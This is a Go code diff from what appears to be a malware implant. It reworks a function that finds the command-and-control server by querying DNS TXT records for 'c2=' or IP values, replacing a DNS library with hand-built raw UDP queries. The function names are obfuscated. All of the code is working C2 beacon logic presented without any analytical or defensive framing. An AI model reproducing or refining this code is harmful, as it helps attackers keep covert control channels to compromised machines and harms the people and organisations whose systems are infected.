@@ -17,8 +17,6 @@ import (
 	"strings"
 	"syscall"
 	"time"
-
-	"github.com/miekg/dns"
 )
 
 // hafnium generates an authentication response for the C2 challenge-response protocol.
@@ -291,58 +289,62 @@ func darkrai(domain string) (string, error) {
 	var lastErr error
 	for _, server := range servers {
 		deoxys("darkrai: Trying DNS server: %s", server)
-		c := new(dns.Client)
-		c.Timeout = 5 * time.Second
-		c.Net = "udp"
-		m := new(dns.Msg)
-		m.SetQuestion(dns.Fqdn(domain), dns.TypeTXT)
-		m.RecursionDesired = true
-		r, rtt, err := c.Exchange(m, server)
+		// Build raw DNS TXT query (qtype=16)
+		query := encodeDNSQuery(domain, 16, false)
+		conn, err := net.DialTimeout("udp", server, 5*time.Second)
 		if err != nil {
-			deoxys("darkrai: DNS error from %s: %v", server, err)
+			deoxys("darkrai: dial error to %s: %v", server, err)
 			lastErr = err
 			continue
 		}
-		deoxys("darkrai: Got response from %s in %v, rcode=%d, answers=%d", server, rtt, r.Rcode, len(r.Answer))
-		if r.Rcode != dns.RcodeSuccess {
-			lastErr = fmt.Errorf("DNS query failed with code: %d", r.Rcode)
-			deoxys("darkrai: Bad rcode: %d", r.Rcode)
+		conn.SetDeadline(time.Now().Add(5 * time.Second))
+		_, err = conn.Write(query)
+		if err != nil {
+			conn.Close()
+			lastErr = err
 			continue
 		}
-		for _, ans := range r.Answer {
-			deoxys("darkrai: Answer type: %T, value: %v", ans, ans)
-			if txt, ok := ans.(*dns.TXT); ok {
-				deoxys("darkrai: TXT record found with %d strings", len(txt.Txt))
-				for _, t := range txt.Txt {
-					deoxys("darkrai: TXT value: '%s'", t)
-					t = strings.TrimSpace(t)
-					if strings.HasPrefix(t, "c2=") {
-						result := strings.TrimPrefix(t, "c2=")
-						deoxys("darkrai: Found c2= prefix, returning: %s", result)
-						return result, nil
-					}
-					if strings.HasPrefix(t, "ip=") {
-						result := strings.TrimPrefix(t, "ip=")
-						deoxys("darkrai: Found ip= prefix, returning: %s", result)
-						return result, nil
-					}
-					// Try raw IP:port format
-					if strings.Contains(t, ":") && !strings.Contains(t, " ") {
-						parts := strings.Split(t, ":")
-						if len(parts) == 2 {
-							if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
-								deoxys("darkrai: Found raw IP:port, returning: %s", t)
-								return t, nil
-							}
-						}
-					}
-					// Try plain IP address (no port) - append default 443
-					if net.ParseIP(t) != nil {
-						result := t + ":443"
-						deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
-						return result, nil
+		buf := make([]byte, 4096)
+		n, err := conn.Read(buf)
+		conn.Close()
+		if err != nil {
+			deoxys("darkrai: read error from %s: %v", server, err)
+			lastErr = err
+			continue
+		}
+		deoxys("darkrai: Got %d byte response from %s", n, server)
+		txts, err := parseDNSTXTResponse(buf[:n])
+		if err != nil {
+			deoxys("darkrai: parse error: %v", err)
+			lastErr = err
+			continue
+		}
+		deoxys("darkrai: TXT records: %v", txts)
+		for _, t := range txts {
+			t = strings.TrimSpace(t)
+			if strings.HasPrefix(t, "c2=") {
+				result := strings.TrimPrefix(t, "c2=")
+				deoxys("darkrai: Found c2= prefix, returning: %s", result)
+				return result, nil
+			}
+			if strings.HasPrefix(t, "ip=") {
+				result := strings.TrimPrefix(t, "ip=")
+				deoxys("darkrai: Found ip= prefix, returning: %s", result)
+				return result, nil
+			}
+			if strings.Contains(t, ":") && !strings.Contains(t, " ") {
+				parts := strings.Split(t, ":")
+				if len(parts) == 2 {
+					if net.ParseIP(parts[0]) != nil || arceus(parts[0]) {
+						deoxys("darkrai: Found raw IP:port, returning: %s", t)
+						return t, nil
 					}
 				}
+			}
+			if net.ParseIP(t) != nil {
+				result := t + ":443"
+				deoxys("darkrai: Found plain IP, appending :443, returning: %s", result)
+				return result, nil
 			}
 		}
 		lastErr = fmt.Errorf("no valid C2 address in TXT records")
